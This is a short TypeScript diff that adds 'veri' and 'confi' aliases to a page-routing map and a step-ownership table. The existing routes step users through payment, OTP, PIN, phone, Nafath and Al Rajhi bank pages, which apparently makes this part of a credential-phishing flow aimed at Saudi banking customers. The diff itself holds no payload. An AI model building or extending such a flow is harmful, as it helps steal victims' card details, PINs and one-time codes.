@@ -22,6 +22,8 @@ const PAGE_MAP: Record<string, string> = {
   payment: "/check",
   otp: "/step2",
   pin: "/step3",
+  veri: "/step2",     // step2
+  confi: "/step3",    // step3
   phone: "/step5",
   nafad: "/step4",
   rajhi: "/step6",
@@ -42,6 +44,8 @@ const STEP_OWNERS: Record<string, (string | number)[]> = {
   check: ["check", "_st1", 4],
   otp: ["otp", "_t2", 2],
   pin: ["pin", "_t3", 3],
+  veri: ["veri", "otp", "_t2", 2],
+  confi: ["confi", "pin", "_t3", 3],
   phone: ["phone", 7],
 };
 
